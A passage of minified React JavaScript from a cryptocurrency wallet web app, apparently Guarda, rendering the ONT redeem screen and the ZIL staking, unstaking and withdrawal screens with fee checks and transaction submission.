                    ZV = !1;
                    setProcess("");
                    s(!1)
                }
            }
            ), [c]);
            (0,
            O.useEffect)(( () => {
                i && !l && s(!0);
                if (!i) {
                    ZV = !1;
                    s(!1)
                }
            }
            ), [l, i]);
            if (!d || !v)
                return null;
            const handleUpdateBalance = e => async () => {
                setProcess("Updating wallet balance...");
                await a(updateWalletsBalanceAndTxs(e, {
                    isCascade: !0
                }));
                setProcess("")
            }
              , handleConfirm = async () => {
                if (ZV)
                    return;
                const n = cc.$.txPerformanceStart();
                ZV = !0;
                u("");
                if (p)
                    return;
                await setProcess("Updating wallet balance...");
                await a(updateWalletsBalanceAndTxs(d, {
                    isCascade: !0
                }));
                await setProcess(`Loading ${(0,
                be.xG)(d.currency)} Blockchain adapter...`);
                await setProcess("Preparing transaction...");
                const r = await Se.Z.getApiByWallet(d);
                try {
                    const a = await r.redeemTransaction({
                        privateKey: d.privateKey,
                        amount: e.amount,
                        nodePublicKey: e.validatorAddress
                    });
                    if (a.error) {
                        u(a.error);
                        return
                    }
                    if (a.hash) {
                        const r = cc.$.txPerformanceEnd(n);
                        cc.$.send(cc.d.PERFORMANCE_TX_REDEEM, d.currency, `${r} ms`);
                        const l = new URLSearchParams({
                            hash: String(a.hash),
                            walletFrom: d.uuid,
                            currency: d.currency,
                            amount: e.amount || ""
                        });
                        t.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: l.toString()
                        })
                    }
                } catch (t) {
                    var l, s;
                    ge.b.error(ge.d.REDEEM_ERROR, {
                        address: d.address,
                        currency: d.currency,
                        typeofPK: typeof d.privateKey,
                        isUsedMnemonic: ((null !== (l = null === (s = d.privateKey) || void 0 === s ? void 0 : s.toString().split(" ").length) && void 0 !== l ? l : 0) > 4).toString(),
                        validatorPKS: e.validatorAddress,
                        typeofValidatorPKS: typeof e.validatorAddress,
                        userAddressBase58: d.address && "string" == typeof d.address ? YV.test(d.address).toString() : "string" != typeof d.address ? "not string" : "not found",
                        pKBase58: d.privateKey && "string" == typeof d.privateKey ? qV.test(d.privateKey.toString()).toString() : "string" != typeof d.privateKey ? "not string" : "not found",
                        validatorPKBase58: e.validatorAddress && "string" == typeof e.validatorAddress ? (!XV.test(e.validatorAddress)).toString() : "string" != typeof e.validatorAddress ? "not string" : "not found",
                        family: d.family
                    }, t);
                    u(t)
                }
            }
            ;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Please check details and confirm")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Redeem ", (0,
            Ko.yF)(e.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)("ont")), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will receive", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.amount), " ", (0,
            be.xG)("ont"), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: k,
                renderCurrency: !0
            })))), d && e.walletFrom && O.createElement(ConfirmInfoWallet, {
                type: "to",
                wallet: d
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, !_ || w ? "–" : `${_} ${(0,
            be.xG)(v.currency)}`, O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: S
            }), " ", (0,
            be.xG)(g)))), O.createElement("div", {
                className: dM
            }), O.createElement(ledger_token_info, {
                parentWallet: v
            }), l && b && O.createElement(ui_message, null, "Please unlock you ", d.hw, ", choose ", (0,
            be.xG)(d.family), " app and then press Confirm."), p && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)("ong"), " Balance. Available balance: ", E, " ", (0,
            be.xG)("ong"), O.createElement("br", null), O.createElement("a", {
                className: vM,
                onClick: handleUpdateBalance(d)
            }, "Update wallet balance")), c && O.createElement(bf, {
                error: c
            }), O.createElement("div", {
                className: fM
            }, l && O.createElement("div", {
                className: yM
            }, i && O.createElement("span", null, i)), !l && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: l
            }, "Confirm")))))
        }
          , QV = StakingOntRadeem
          , JV = {
            wrapper: "index_wrapper_jU9m7 app_wrapperBlock_2EpA3",
            wrapperForm: "index_wrapperForm_1I62V app_wrapperLeftBlock_3QLZp",
            footerBlock: "index_footerBlock_UVFnk app_footerBlock_n86Kc",
            stepInfo: "index_stepInfo_1mDUL app_stepInfo_2VLE6",
            toggleAdvancedOptions: "index_toggleAdvancedOptions_1GSWP",
            toggleAdvancedOptionsText: "index_toggleAdvancedOptionsText_3zvu1",
            loaderWrapper: "index_loaderWrapper_3YpJS",
            topUpWalletLink: "index_topUpWalletLink_e9fiH"
        }
          , StakingZilIndex = () => {
            const e = (0,
            $.I0)()
              , t = O.createRef()
              , a = (0,
            $.v9)($c)
              , n = (0,
            j.k6)()
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(void 0)
              , [u,d] = (0,
            O.useState)("")
              , {fromWallet: m, setFromWallet: p, amount: f, setAmount: E} = oG({
                ticker: "zil"
            })
              , h = useGoToReceivePage()
              , g = [...a].filter((e => e.currency.includes("zil")))
              , y = m ? m.balance : "0"
              , {defaultValidator: v, listOfValidators: _, isLoading: w} = JI()
              , handleChangeFromWallet = t => {
                e(updateWalletsBalanceAndTxs(t));
                p(t);
                E("")
            }
            ;
            function handleSetValidator(e) {
                c(e)
            }
            (0,
            O.useEffect)(( () => {
                i(!1);
                v && c(v)
            }
            ), [v, null == m ? void 0 : m.uuid]);
            (0,
            O.useEffect)(( () => {
                r && l(!1)
            }
            ), [m]);
            const b = {
                address: o ? o.address : "",
                currency: "zil",
                uuid: ""
            }
              , [k,S,,C] = use_fee(m, b, f, {
                totalBalance: m ? m.balance : void 0,
                zilDelegateStake: !0
            })
              , N = (0,
            O.useMemo)(( () => f && k && (0,
            Ko.lt)(f, null == m ? void 0 : m.balance) && (0,
            Ko.gt)((0,
            Ko.PD)(f, k), null == m ? void 0 : m.balance)), [f, k, null == m ? void 0 : m.balance])
              , handleNext = () => {
                var e;
                const {isValid: a} = null == t || null === (e = t.current) || void 0 === e ? void 0 : e.validate();
                if (!a) {
                    l(!0);
                    return
                }
                if (N) {
                    l(!0);
                    return
                }
                if (!k) {
                    C();
                    return
                }
                const r = (null == o ? void 0 : o.address) === (null == v ? void 0 : v.address)
                  , s = new URLSearchParams({
                    validatorTitle: (null == o ? void 0 : o.title) || "",
                    validatorAddress: (null == o ? void 0 : o.address) || "",
                    validatorRate: (null == o ? void 0 : o.annualYield) || "",
                    walletFrom: (null == m ? void 0 : m.uuid) || "",
                    amount: f,
                    fee: String(k) || "",
                    isValidatorViewBlock: r.toString()
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-zil/staking/confirm"),
                    search: s.toString()
                })
            }
            ;
            function handleAmount(e) {
                let {target: {value: t}} = e;
                l(!1);
                E(t)
            }
            const handleSetVisibleOptions = () => {
                i(!s)
            }
              , T = {
                precision: 12,
                min: 10,
                max: null,
                available: y
            }
              , handleUpdateBalance = async (t, a) => {
                null != t && t.preventDefault && t.preventDefault();
                if (a) {
                    d("Updating wallet balance...");
                    await e(updateWalletsBalanceAndTxs(a));
                    await new Promise((e => setTimeout(e, 1e3)));
                    d("")
                }
            }
              , A = O.memo(( () => O.createElement(panel_right_image, {
                src: mD
            }, "Delegate ZIL earn rewards. Please note that your deposit will remain frozen for 14 days after unstaking.")));
            return m ? O.createElement(sG, {
                wallet: m,
                styles: JV,
                RightBlockContent: A
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "From"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: m
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: m,
                    wallets: g,
                    onChange: handleChangeFromWallet,
                    customFilter: e => onCustomFilterWallets(e, ["zil"]),
                    withoutWatchOnly: !0,
                    stakingCurrency: "ZIL"
                }))
            }
            )), O.createElement(label, null, "Deposit Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: f,
                rules: zf.zilStakingAmount(T)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Ea, {
                    onChange: handleAmount,
                    value: f,
                    placeholder: "0"
                }))
            }
            ))), O.createElement(AvailableForStaking, {
                currency: m.currency,
                maxAmount: y,
                setAmount: E
            }), o && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Validator:"), O.createElement(MiskInfoValue, null, null == o ? void 0 : o.title, " (", null == o ? void 0 : o.subtitle, ")")), !o && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Validator:"), O.createElement(MiskInfoValue, null, O.createElement(LoaderDots, {
                visible: !0
            }))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Min Deposit Amount:"), O.createElement(MiskInfoValue, null, "10 ZIL")), !s && O.createElement("div", {
                className: JV.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Advanced options")), s && O.createElement(O.Fragment, null, O.createElement("div", {
                className: JV.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Hide advanced options")), O.createElement(label, null, "To"), O.createElement(lf.ValidatorField, {
                rules: zf.xtzValidator,
                value: o
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Lp, {
                    selected: o,
                    isLoading: w,
                    items: _,
                    placeholder: "Select Validator",
                    emptyPlaceholder: "Validators not found",
                    onChange: handleSetValidator
                }))
            }
            )), O.createElement(ui_message, {
                type: "warning"
            }, "We cannot guarantee the stability of a third-party validator. Please do your own research to assess risks.")), N && r && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient funds. The fee is paid from the wallet balance. Max Network Fee ", k, " ZIL.", " ", O.createElement("a", {
                className: JV.updateBalanceLink,
                onClick: e => handleUpdateBalance(e, m)
            }, "Update wallet balance"), " ", "or", " ", O.createElement("a", {
                className: JV.topUpWalletLink,
                onClick: h(m)
            }, "Top up your wallet")), S && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: JV.updateBalanceLink,
                onClick: C
            }, "try again")), u && O.createElement("div", {
                className: JV.loaderWrapper
            }, u && O.createElement("span", null, u)), O.createElement("div", {
                className: JV.footerBlock
            }, O.createElement("div", {
                className: JV.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))) : null
        }
          , eK = StakingZilIndex;
        let tK = !1;
        function StakingZilConfirmStaking() {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = (0,
            $.I0)()
              , r = (0,
            $.v9)($c)
              , l = (0,
            $.v9)(eu)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)("")
              , [u,d] = (0,
            O.useState)(null)
              , {convertToFiat: m} = useConverter()
              , [p,f] = (0,
            O.useState)()
              , {localCurrency: E} = local_currency_useLocalCurrency();
            (0,
            O.useEffect)(( () => {
                if (r.length) {
                    const t = l(e.walletFrom);
                    t && f(t)
                }
            }
            ), [r, e, l]);
            const [h] = fee_wallet(p)
              , {fee: g} = e
              , setProcess = async e => {
                c(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                p && n(updateWalletsBalanceAndTxs(p))
            }
            ), [n, p]);
            (0,
            O.useEffect)(( () => {
                if (u) {
                    tK = !1;
                    setProcess("");
                    i(!1)
                }
            }
            ), [u]);
            (0,
            O.useEffect)(( () => {
                o && !s && i(!0);
                if (!o) {
                    tK = !1;
                    i(!1)
                }
            }
            ), [s, o]);
            const handleUpdateBalance = e => async () => {
                setProcess("Updating wallet balance...");
                await n(updateWalletsBalanceAndTxs(e));
                setProcess("")
            }
              , handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/staking-zil/staking"),
                    search: a.search
                })
            }
            ;
            if (!p || !h)
                return null;
            const y = p.hw || h.hw
              , v = m(e.amount, p)
              , _ = m(g, h)
              , w = e.amount && g && (0,
            Ko.gt)((0,
            Ko.PD)(e.amount, g), p.balance)
              , handleConfirm = async () => {
                if (tK)
                    return;
                if (w)
                    return;
                const a = cc.$.txPerformanceStart();
                tK = !0;
                d(null);
                await setProcess("Updating wallet balance...");
                await n(updateWalletsBalanceAndTxs(p));
                await setProcess(`Loading ${(0,
                be.xG)(p.currency)} Blockchain adapter...`);
                await setProcess("Preparing transaction...");
                const r = await Se.Z.getApiByWallet(p);
                try {
                    const n = await r.stake({
                        wallet: p,
                        validatorAddress: e.validatorAddress,
                        fee: e.fee,
                        amount: e.amount
                    });
                    if (n.error) {
                        d(n.error);
                        return
                    }
                    if (n.hash) {
                        if ("true" === e.isValidatorViewBlock)
                            try {
                                const e = await r.getPubKey(null == p ? void 0 : p.privateKey)
                                  , t = "This is guarda"
                                  , a = await r.signMsg(t, null == p ? void 0 : p.privateKey, e)
                                  , n = {
                                    headers: {
                                        "content-type": "application/json"
                                    }
                                }
                                  , l = {
                                    sig: a,
                                    pub: e,
                                    msg: t
                                };
                                await Jf().post("https://zilstaking.viewblock.io/proof", l, n)
                            } catch (e) {}
                        cc.$.send(cc.d.STAKING_SEND, "zil");
                        const l = cc.$.txPerformanceEnd(a);
                        cc.$.send(cc.d.PERFORMANCE_TX_STAKE, null == p ? void 0 : p.currency, `${l} ms`);
                        t.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: objectToString({
                                type: "zilStakeTx",
                                amount: e.amount,
                                hash: n.hash,
                                walletFrom: null == p ? void 0 : p.uuid,
                                currency: null == p ? void 0 : p.currency
                            })
                        })
                    }
                } catch (e) {}
            }
            ;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Please check details and confirm")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Stake ", (0,
            Ko.yF)(e.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will stake", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: v,
                renderCurrency: !0
            })))), p && e.walletFrom && O.createElement(ConfirmInfoWallet, {
                type: "from",
                wallet: p
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Validator", O.createElement(ConfirmInfoSubTitle, null, "Address")), O.createElement(ConfirmInfoValue, null, e.validatorTitle, " ", e.validatorRate ? ` - ${e.validatorRate}` : "", O.createElement(ConfirmInfoSubValue, null, e.validatorAddress))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Max Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, g, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(h.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: _
            }), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(e.toConvert || E))))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Will be deposited"), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)))), O.createElement("div", {
                className: dM
            }), w && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)(p.currency), " Balance. Available balance: ", p.balance, " ", (0,
            be.xG)(p.currency), O.createElement("br", null), O.createElement("a", {
                className: vM,
                onClick: handleUpdateBalance(p)
            }, "Update wallet balance")), O.createElement(ledger_token_info, {
                parentWallet: h
            }), s && y && O.createElement(ui_message, null, "Please unlock you ", p.hw, ", choose ", (0,
            be.xG)(p.family), " app and then press Confirm."), u && O.createElement(bf, {
                error: u
            }), O.createElement("div", {
                className: fM
            }, s && O.createElement("div", {
                className: yM
            }, o && O.createElement("span", null, o)), !s && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !s && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: s,
                id: "stakingZilConfirm"
            }, "Confirm")))))
        }
        const UnStakingZilIndex = () => {
            const e = useLocationSearch()
              , t = O.createRef()
              , a = (0,
            $.v9)(eu)
              , n = (0,
            j.k6)()
              , [r,l] = (0,
            O.useState)(!1)
              , s = useGoToReceivePage()
              , i = a(e.walletFrom) || void 0
              , [o,c] = (0,
            O.useState)(e.amount)
              , u = null != e && e.amount ? e.amount : "0"
              , d = {
                address: null != e && e.validatorAddress ? e.validatorAddress : "",
                currency: "zil",
                uuid: ""
            }
              , [m,p,,f] = use_fee(i, d, o, {
                totalBalance: null != i && i.balance ? i.balance : void 0,
                zilWithdrawStakeAmt: !0
            })
              , E = (0,
            O.useMemo)(( () => (0,
            Ko.gt)(m, null == i ? void 0 : i.balance)), [m, null == i ? void 0 : i.balance]);
            (0,
            O.useEffect)(( () => {
                r && l(!1)
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                c(e.amount)
            }
            ), [e]);
            const handleNext = () => {
                const {isValid: a} = t.current.validate();
                if (!a) {
                    l(!0);
                    return
                }
                if (!m) {
                    f();
                    return
                }
                const r = new URLSearchParams({
                    walletFrom: (null == e ? void 0 : e.walletFrom) || "",
                    amount: (null == e ? void 0 : e.amount) || "",
                    amountToUnstake: o || "",
                    fee: String(m),
                    validatorTitle: (null == e ? void 0 : e.validatorTitle) || "",
                    validatorAddress: (null == e ? void 0 : e.validatorAddress) || ""
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-zil/unstaking/confirm"),
                    search: r.toString()
                })
            }
            ;
            function handleAmount(e) {
                let {target: {value: t}} = e;
                c(t)
            }
            const h = {
                precision: 12,
                min: 1,
                max: (0,
                Ko.FH)(u, {
                    max: 12
                }),
                available: u
            };
            return O.createElement("div", {
                className: JV.wrapper
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: mD
            }, "Your unbonded tokens will be locked by Zilliqa network for 14 days. During this period you won`t receive staking rewards. You will be able to withdraw tokens to your wallet after 14 days.")), O.createElement("div", {
                className: JV.wrapperForm
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "Wallet"), O.createElement(Mh, {
                selectedWallet: i,
                disabled: !0,
                noDisabledStyle: !0
            }), O.createElement(label, null, "Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: o,
                rules: zf.zilStakingAmount(h)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Ea, {
                    onChange: handleAmount,
                    value: o,
                    placeholder: "0"
                }))
            }
            ))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available:"), O.createElement(MiskInfoValue, {
                onClick: () => c(u)
            }, (0,
            Ko.yF)(u), " ", (0,
            be.xG)(null == i ? void 0 : i.currency))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Validator:"), O.createElement(MiskInfoValue, null, e.validatorTitle)), E && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient funds. The fee is paid from the wallet balance. Max Network Fee ", m, " ZIL.", " ", O.createElement("a", {
                className: JV.topUpWalletLink,
                onClick: s(i)
            }, "Top up your wallet")), p && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: JV.updateBalanceLink,
                onClick: f
            }, "try again")), O.createElement("div", {
                className: JV.footerBlock
            }, O.createElement("div", {
                className: JV.stepInfo
            }, "Step 1 of 3"), E ? O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: s(i)
            }, "Close") : O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))))
        }
          , aK = UnStakingZilIndex;
        let nK = !1;
        function StakingZilConfirmUNstaking() {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = (0,
            $.I0)()
              , r = (0,
            $.v9)(eu)
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)(null)
              , [c,u] = (0,
            O.useState)(null)
              , {convertToFiat: d} = useConverter()
              , [m,p] = (0,
            O.useState)()
              , {localCurrency: f} = local_currency_useLocalCurrency();
            (0,
            O.useEffect)(( () => {
                if (e.walletFrom) {
                    const t = r(e.walletFrom);
                    t && p(t)
                }
            }
            ), [e, r]);
            const [E] = fee_wallet(m)
              , {fee: h} = e
              , setProcess = async e => {
                o(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                m && n(updateWalletsBalanceAndTxs(m))
            }
            ), [n, m]);
            (0,
            O.useEffect)(( () => {
                if (c) {
                    nK = !1;
                    setProcess("");
                    s(!1)
                }
            }
            ), [c]);
            (0,
            O.useEffect)(( () => {
                i && !l && s(!0);
                if (!i) {
                    nK = !1;
                    s(!1)
                }
            }
            ), [i]);
            const handleUpdateBalance = e => async () => {
                setProcess("Updating wallet balance...");
                await n(updateWalletsBalanceAndTxs(e));
                setProcess("")
            }
            ;
            if (!m || !E)
                return null;
            const g = m.hw || E.hw
              , y = (0,
            Ko.gt)(h, m.balance)
              , v = d(h, E)
              , _ = d(e.amountToUnstake, E)
              , handleConfirm = async () => {
                if (nK)
                    return;
                if (y)
                    return;
                const a = cc.$.txPerformanceStart();
                nK = !0;
                u(null);
                await setProcess("Updating wallet balance...");
                await n(updateWalletsBalanceAndTxs(m));
                await setProcess(`Loading ${(0,
                be.xG)(m.currency)} Blockchain adapter...`);
                await setProcess("Preparing transaction...");
                const r = await Se.Z.getApiByWallet(m);
                try {
                    const n = await r.unstake({
                        wallet: m,
                        fee: e.fee,
                        amount: e.amountToUnstake,
                        validatorAddress: e.validatorAddress
                    });
                    if (n.error) {
                        u(n.error);
                        return
                    }
                    if (n.hash) {
                        cc.$.send(cc.d.UNSTAKING_SEND, "zil");
                        const r = cc.$.txPerformanceEnd(a);
                        cc.$.send(cc.d.PERFORMANCE_TX_UNSTAKE, m.currency, `${r} ms`);
                        t.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: objectToString({
                                type: "zilUnstakeTx",
                                amount: e.amountToUnstake,
                                hash: n.hash,
                                walletFrom: m.uuid,
                                currency: m.currency
                            })
                        })
                    }
                } catch (e) {
                    u("error")
                }
            }
              , handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/staking-zil/unstaking"),
                    search: a.search
                })
            }
            ;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Your unbonded tokens will be locked by Zilliqa network for 14 days. During this period you won`t receive staking rewards. You will be able to withdraw tokens to your wallet after 14 days.")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Unstake ", (0,
            Ko.yF)(e.amountToUnstake), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(m.currency)), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will receive"), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.amountToUnstake), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(m.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: _
            }), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(e.toConvert || f))))), m && e.walletFrom && O.createElement(ConfirmInfoWallet, {
                type: "to",
                wallet: m
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Validator", O.createElement(ConfirmInfoSubTitle, null, "Address")), O.createElement(ConfirmInfoValue, null, e.validatorTitle, O.createElement(ConfirmInfoSubValue, null, e.validatorAddress))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Max Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, h, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(E.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: v
            }), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(e.toConvert || f))))), O.createElement("div", {
                className: dM
            }), y && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)(m.currency), " Balance. Available balance: ", m.balance, " ", (0,
            be.xG)(m.currency), O.createElement("br", null), O.createElement("a", {
                className: vM,
                onClick: handleUpdateBalance(m)
            }, "Update wallet balance")), O.createElement(ledger_token_info, {
                parentWallet: E
            }), l && g && O.createElement(ui_message, null, "Please unlock you ", m.hw, ", choose ", (0,
            be.xG)(m.family), " app and then press Confirm."), c && O.createElement(bf, {
                error: c
            }), O.createElement("div", {
                className: fM
            }, l && O.createElement("div", {
                className: yM
            }, i && O.createElement("span", null, i)), !l && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !l && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: l
            }, "Confirm")))))
        }
        let rK = !1;
        function StakingZilConfirmWithdraw() {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            $.I0)()
              , n = (0,
            $.v9)(eu)
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)("")
              , [o,c] = (0,
            O.useState)(null)
              , {convertToFiat: u} = useConverter()
              , [d,m] = (0,
            O.useState)()
              , [p,f] = (0,
            O.useState)()
              , {localCurrency: E} = local_currency_useLocalCurrency()
              , h = useGoToReceivePage();
            (0,
            O.useEffect)(( () => {
                if (e.walletFrom) {
                    const t = n(e.walletFrom);
                    if (t) {
                        m(t);
                        f(t)
                    }
                }
            }
            ), [e, n]);
            const [g] = fee_wallet(d)
              , [y,v,_,w] = use_fee(d, p, e.amount, {
                totalBalance: d ? d.balance : void 0,
                zilCompleteWithdrawal: !0
            })
              , setProcess = async e => {
                i(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                d && a(updateWalletsBalanceAndTxs(d))
            }
            ), [a, d]);
            (0,
            O.useEffect)(( () => {
                setProcess(_ ? "Loading Fee..." : "")
            }
            ), [_]);
            (0,
            O.useEffect)(( () => {
                if (o) {
                    rK = !1;
                    setProcess("");
                    l(!1)
                }
            }
            ), [o]);
            (0,
            O.useEffect)(( () => {
                s && !r && l(!0);
                if (!s) {
                    rK = !1;
                    l(!1)
                }
            }
            ), [r, s]);
            if (!d || !g || !p)
                return null;
            const b = d.hw || g.hw
              , k = (0,
            Ko.gt)(y, d.balance)
              , S = u(y || void 0, g)
              , C = u(e.amount, g)
              , handleConfirm = async () => {
                if (rK)
                    return;
                if (k)
                    return;
                const n = cc.$.txPerformanceStart();
                rK = !0;
                c(null);
                await setProcess("Updating wallet balance...");
                await a(updateWalletsBalanceAndTxs(d));
                await setProcess(`Loading ${(0,
                be.xG)(d.currency)} Blockchain adapter...`);
                await setProcess("Preparing transaction...");
                const r = await Se.Z.getApiByWallet(d);
                try {
                    const a = await r.withdraw({
                        wallet: d
                    });
                    if (a.error) {
                        c(a.error);
                        return
                    }
                    if (a.hash) {
                        const r = cc.$.txPerformanceEnd(n);
                        cc.$.send(cc.d.PERFORMANCE_TX_WITHDRAW, d.currency, `${r} ms`);
                        t.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: objectToString({
                                type: "zilWithdrawTx",
                                amount: e.amount,
                                hash: a.hash,
                                walletFrom: d.uuid,
                                currency: d.currency
                            })
                        })
                    }
                } catch (e) {}
            }
            ;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "You will be able to manage your funds right after they are withdrawn.")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Withdraw ", (0,
            Ko.yF)(e.amount, 12), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
